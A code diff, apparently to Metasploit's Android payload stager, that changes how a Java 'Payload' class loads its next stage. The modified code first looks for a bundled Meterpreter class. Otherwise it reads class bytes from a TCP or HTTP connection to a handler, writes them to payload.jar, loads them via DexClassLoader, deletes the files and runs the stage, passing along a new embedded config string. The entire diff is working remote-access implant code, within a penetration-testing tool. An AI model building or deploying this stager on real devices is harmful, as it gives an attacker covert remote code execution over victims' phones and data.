@@ -20,8 +20,9 @@ import dalvik.system.DexClassLoader;
 public class Payload {
 
     public static final String URL =            "ZZZZ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ";
+    public static final String CONFIG =         "UUUU                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ";
     public static final String CERT_HASH =      "WWWW                                        ";
-    public static final String TIMEOUTS =    "TTTT                                           ";
+    public static final String TIMEOUTS =       "TTTT                                                ";
 
     public static long session_expiry;
     public static long comm_timeout;
@@ -45,7 +46,7 @@ public class Payload {
     }
 
     public static void startInPath(String path) {
-        parameters = new String[]{path};
+        parameters = new String[]{path, CONFIG.substring(4)};
         startAsync();
     }
 
@@ -53,7 +54,7 @@ public class Payload {
         if (args != null) {
             File currentDir = new File(".");
             String path = currentDir.getAbsolutePath();
-            parameters = new String[]{path};
+            parameters = new String[]{path, CONFIG.substring(4)};
         }
         long sessionExpiry;
         long commTimeout;
@@ -117,7 +118,7 @@ public class Payload {
         }
         OutputStream out = new ByteArrayOutputStream();
         DataInputStream in = new DataInputStream(inStream);
-        readAndRunStage(in, out, parameters);
+        runNextStage(in, out, parameters);
     }
 
     private static void runStagefromTCP(String url) throws Exception {
@@ -138,45 +139,53 @@ public class Payload {
         if (sock != null) {
             DataInputStream in = new DataInputStream(sock.getInputStream());
             OutputStream out = new DataOutputStream(sock.getOutputStream());
-            readAndRunStage(in, out, parameters);
+            runNextStage(in, out, parameters);
         }
     }
 
-    private static void readAndRunStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
-        String path = parameters[0];
-        String filePath = path + File.separatorChar + "payload.jar";
-        String dexPath = path + File.separatorChar + "payload.dex";
+    private static void runNextStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+        try {
+            Class<?> existingClass = Payload.class.getClassLoader().
+                    loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
+            existingClass.getConstructor(new Class[]{
+                    DataInputStream.class, OutputStream.class, String[].class, boolean.class
+            }).newInstance(in, out, parameters, false);
+        } catch (ClassNotFoundException e) {
+            String path = parameters[0];
+            String filePath = path + File.separatorChar + "payload.jar";
+            String dexPath = path + File.separatorChar + "payload.dex";
 
-        // Read the class name
-        int coreLen = in.readInt();
-        byte[] core = new byte[coreLen];
-        in.readFully(core);
-        String classFile = new String(core);
+            // Read the class name
+            int coreLen = in.readInt();
+            byte[] core = new byte[coreLen];
+            in.readFully(core);
+            String classFile = new String(core);
 
-        // Read the stage
-        coreLen = in.readInt();
-        core = new byte[coreLen];
-        in.readFully(core);
+            // Read the stage
+            coreLen = in.readInt();
+            core = new byte[coreLen];
+            in.readFully(core);
 
-        File file = new File(filePath);
-        if (!file.exists()) {
-            file.createNewFile();
+            File file = new File(filePath);
+            if (!file.exists()) {
+                file.createNewFile();
+            }
+            FileOutputStream fop = new FileOutputStream(file);
+            fop.write(core);
+            fop.flush();
+            fop.close();
+
+            // Load the stage
+            DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
+                    Payload.class.getClassLoader());
+            Class<?> myClass = classLoader.loadClass(classFile);
+            final Object stage = myClass.newInstance();
+            file.delete();
+            new File(dexPath).delete();
+            myClass.getMethod("start",
+                    new Class[]{DataInputStream.class, OutputStream.class, String[].class})
+                    .invoke(stage, in, out, parameters);
         }
-        FileOutputStream fop = new FileOutputStream(file);
-        fop.write(core);
-        fop.flush();
-        fop.close();
-
-        // Load the stage
-        DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
-                Payload.class.getClassLoader());
-        Class<?> myClass = classLoader.loadClass(classFile);
-        final Object stage = myClass.newInstance();
-        file.delete();
-        new File(dexPath).delete();
-        myClass.getMethod("start",
-                new Class[]{DataInputStream.class, OutputStream.class, String[].class})
-                .invoke(stage, in, out, parameters);
 
         session_expiry = -1;
     }
